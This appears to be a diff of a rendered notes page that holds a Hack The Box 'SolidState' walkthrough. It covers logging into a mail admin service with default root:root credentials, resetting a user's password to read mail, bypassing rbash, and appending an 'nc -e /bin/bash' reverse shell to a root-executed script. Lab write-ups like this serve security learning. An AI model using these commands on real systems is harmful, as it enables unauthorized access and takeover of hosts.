@@ -25,7 +25,7 @@
         
           
           
-          <meta name="theme-color" content="#ff6e42">
+          <meta name="theme-color" content="#000000">
         
       
     
@@ -52,7 +52,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="green">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
       
   
     
@@ -153,9 +153,7 @@
 
 
 
-  
-
-<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
       
@@ -191,7 +189,9 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" data-md-state="indeterminate" type="checkbox" id="nav-2" checked>
@@ -258,17 +258,76 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
       
       <label class="md-nav__link" for="nav-3">
+        File Transfer
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="File Transfer" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          File Transfer
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/filetransfer_setup/" class="md-nav__link">
+        Environment Setup
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/ft_windows/" class="md-nav__link">
+        Windows File Transfers
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+      
+      <label class="md-nav__link" for="nav-4">
         WebApps
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="WebApps" data-md-level="1">
-        <label class="md-nav__title" for="nav-3">
+        <label class="md-nav__title" for="nav-4">
           <span class="md-nav__icon md-icon"></span>
           WebApps
         </label>
@@ -303,17 +362,19 @@
   
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
       
-      <label class="md-nav__link" for="nav-4">
+      <label class="md-nav__link" for="nav-5">
         HTB
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="HTB" data-md-level="1">
-        <label class="md-nav__title" for="nav-4">
+        <label class="md-nav__title" for="nav-5">
           <span class="md-nav__icon md-icon"></span>
           HTB
         </label>
@@ -428,6 +489,58 @@
               </div>
             
             
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#port-25-4555" class="md-nav__link">
+    Port 25 / 4555
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-mindy" class="md-nav__link">
+    Shell as mindy
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege escalation
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -442,7 +555,31 @@
 <h2 id="recon">Recon</h2>
 <ul>
 <li>Nmap
-    <div class="highlight"><pre><span></span><code>Nmap scan report for 10.129.29.189
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>Nmap scan report for 10.129.29.189
 Host is up (0.043s latency).
 Scanned at 2021-02-18 22:33:54 CET for 418s
 Not shown: 65528 closed ports
@@ -467,7 +604,8 @@ PORT      STATE    SERVICE VERSION
 4555/tcp  open     rsip?
 18683/tcp filtered unknown
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></li>
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 <h2 id="port-25-4555">Port 25 / 4555</h2>
 <ul>
@@ -477,7 +615,19 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <li>Creds root:root (Default creds)</li>
 <li>We log in to check users and reset their passwords, looking for reading their mail.</li>
 </ul>
-<div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 4555
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 4555
 Trying 10.129.29.189...
 Connected to 10.129.29.189.
 Escape character is &#39;^]&#39;.
@@ -491,10 +641,75 @@ Welcome root. HELP for a list of commands
 setpassword mindy pass1234
 Password for mindy reset
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>We have luck with mindy's mail.</li>
 </ul>
-<div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 110
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ telnet 10.129.29.189 110
 Trying 10.129.29.189...
 Connected to 10.129.29.189.
 Escape character is &#39;^]&#39;.
@@ -560,6 +775,7 @@ pass: P@55W0rd1!2@
 Respectfully,
 James
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>There is also an <a href="https://www.exploit-db.com/exploits/35513">exploit</a> but it needs user interaction.</li>
 </ul>
@@ -572,11 +788,15 @@ James
     <img alt="" src="../images/solidstate_rbash.png" /></p>
 <ul>
 <li>After trying several bypasses (from <a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">here</a>), we find that we can log with noprofile on bash.
-<div class="highlight"><pre><span></span><code>╰─❯ ssh mindy@10.129.29.189 -t &#39;bash --noprofile&#39;  
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ ssh mindy@10.129.29.189 -t &#39;bash --noprofile&#39;  
 mindy@10.129.29.189&#39;s password: 
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
 uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
-</code></pre></div></li>
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 </li>
 </ul>
@@ -585,13 +805,25 @@ uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
 <ul>
 <li>With pspy we find that user root are executing <code>/opt/tmp.py</code>. We have write permissions over this file.</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ ls -ld tmp.py 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="si">${</span><span class="nv">debian_chroot</span><span class="p">:+(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="si">}</span>mindy@solidstate:/opt$ ls -ld tmp.py 
 -rwxrwxrwx <span class="m">1</span> root root <span class="m">248</span> Feb <span class="m">18</span> <span class="m">17</span>:33 tmp.py
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>Adding our reverse shell to script</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="p">{</span><span class="n">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="nd">@solidstate</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">&quot;os.system(&#39;nc -e /bin/bash 10.10.14.58 5555&#39;)&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">tmp</span><span class="o">.</span><span class="n">py</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="err">$</span><span class="p">{</span><span class="n">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="nd">@solidstate</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span> <span class="n">echo</span> <span class="s2">&quot;os.system(&#39;nc -e /bin/bash 10.10.14.58 5555&#39;)&quot;</span> <span class="o">&gt;&gt;</span> <span class="n">tmp</span><span class="o">.</span><span class="n">py</span>
 <span class="err">$</span><span class="p">{</span><span class="n">debian_chroot</span><span class="p">:</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="n">debian_chroot</span><span class="p">)}</span><span class="n">mindy</span><span class="nd">@solidstate</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="err">$</span> <span class="n">cat</span> <span class="n">tmp</span><span class="o">.</span><span class="n">py</span> 
 <span class="c1">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">os</span>
@@ -603,6 +835,7 @@ uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
 
 <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/bash 10.10.14.58 5555&#39;</span><span class="p">)</span>
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>Root reverse shell</li>
 </ul>
@@ -665,7 +898,7 @@ uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
       <script>
         app = initialize({
           base: "../..",
-          features: ['navigation.expand', 'toc.integrate'],
+          features: ['navigation.sections', 'navigation.expand'],
           search: Object.assign({
             worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
           }, typeof search !== "undefined" && search)
